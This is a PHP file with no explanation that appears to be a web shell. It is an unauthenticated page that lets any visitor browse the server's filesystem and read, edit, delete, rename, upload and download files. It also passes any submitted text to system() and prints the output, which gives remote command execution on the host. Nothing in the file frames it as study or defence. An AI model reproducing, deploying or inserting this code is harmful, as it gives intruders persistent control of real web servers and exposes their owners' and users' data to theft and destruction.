<?php
echo "<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body { font-family: monospace; background-color: #f9f9f9; padding: 20px; }
        pre { font-size: 14px; }
        .cmd-section { margin-top: 20px; }
        .cmd-form { display: flex; gap: 10px; align-items: center; margin-bottom: 10px; }
        .cmd-form input[type='text'] { flex: 1; padding: 5px; font-family: monospace; font-size: 14px; }
        .cmd-form input[type='submit'] { padding: 5px 10px; }
        textarea { width: 100%; height: 200px; font-family: monospace; font-size: 14px; }
    </style>
</head>
<body><pre>";

$cwd = isset($_GET['path']) ? $_GET['path'] : getcwd();
$cwd = realpath($cwd);
if (!$cwd || !file_exists($cwd)) $cwd = getcwd();

// Handle delete
if (isset($_GET['del'])) {
    $target = $_GET['del'];
    if (is_file($target)) {
        unlink($target) ? print("[+] File deleted\n") : print("[-] Failed to delete file\n");
    } elseif (is_dir($target)) {
        rmdir($target) ? print("[+] Directory deleted\n") : print("[-] Failed to delete directory\n");
    }
}

// Handle rename
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $old = $_GET['rename'];
    $new = dirname($old) . '/' . $_POST['newname'];
    rename($old, $new) ? print("[+] Renamed successfully\n") : print("[-] Rename failed\n");
}

// Handle edit
if (isset($_GET['edit']) && isset($_POST['content'])) {
    file_put_contents($_GET['path'] . '/' . $_GET['edit'], $_POST['content']) ? print("[+] File saved\n") : print("[-] Save failed\n");
}

// Upload
if (isset($_POST["upload"]) && isset($_FILES["up"])) {
    $up = $_FILES["up"];
    move_uploaded_file($up["tmp_name"], $cwd . "/" . $up["name"])
        ? print("[+] Uploaded " . $up["name"] . "\n")
        : print("[-] Upload failed\n");
}

// Breadcrumb
echo "<b>Current Dir:</b> ";
$parts = explode("/", $cwd);
$build = "";
foreach ($parts as $part) {
    if ($part === "") { echo "<a href='?path=/'>/</a>"; $build = "/"; continue; }
    $build .= ($build !== "/" ? "/" : "") . $part;
    echo "<a href='?path=" . urlencode($build) . "'>$part</a>/";
}
echo "\n\n";

// File list
$files = @scandir($cwd);
sort($files);
foreach ($files as $f) {
    if ($f == "." || $f == "..") continue;
    $full = $cwd . '/' . $f;
    if (is_dir($full)) {
        echo "[DIR]  <a href='?path=" . urlencode($full) . "'>$f</a> ";
        echo "[ <a href='?del=" . urlencode($full) . "'>delete</a> | <a href='?rename=" . urlencode($full) . "'>rename</a> ]\n";
    } elseif (is_file($full)) {
    echo "[FILE] <a href='?path=" . urlencode($cwd) . "&read=" . urlencode($f) . "'>$f</a> ";
    echo "[ <a href='?path=" . urlencode($cwd) . "&edit=" . urlencode($f) . "'>edit</a> | ";
    echo "<a href='?del=" . urlencode($full) . "'>delete</a> | ";
    echo "<a href='?rename=" . urlencode($full) . "'>rename</a> | ";
    echo "<a href='?path=" . urlencode($cwd) . "&download=" . urlencode($f) . "'>download</a> ]\n";
    }

}

// File viewer
if (isset($_GET['read'])) {
    $target = realpath($cwd . '/' . $_GET['read']);
    if (is_file($target)) {
        echo "\n<b>Viewing:</b> " . htmlspecialchars($target) . "\n\n";
        echo htmlspecialchars(file_get_contents($target));
    }
}

// Edit view
if (isset($_GET['edit']) && !isset($_POST['content'])) {
    $file = $cwd . '/' . $_GET['edit'];
    $content = htmlspecialchars(file_get_contents($file));
    echo "<form method='POST'>
    <textarea name='content' rows='20' style='width:100%;'>$content</textarea><br>
    <input type='submit' value='Save'>
    </form>";
}

// Rename view
if (isset($_GET['rename']) && !isset($_POST['newname'])) {
    echo "<form method='POST'>
    Rename to: <input type='text' name='newname'>
    <input type='submit' value='Rename'>
    </form>";
}

// Upload
echo "<br><form method='POST' enctype='multipart/form-data'>
<b>Upload File:</b> <input type='file' name='up'><input type='submit' name='upload' value='Upload'><br>
</form>";

// CMD Section
echo "<div class='cmd-section'>
<form method='POST' class='cmd-form'>
    <label><b>CMD:</b></label>
    <input type='text' name='cmd'>
    <input type='submit' value='Exec'>
</form>";

if (!empty($_POST["cmd"])) {
    echo "<div>
        <b>CMD Output:</b><br>
        <textarea readonly>";
    system($_POST["cmd"]);
    echo "</textarea></div>";
}
echo "</div>";

echo "</pre></body></html>";
?>
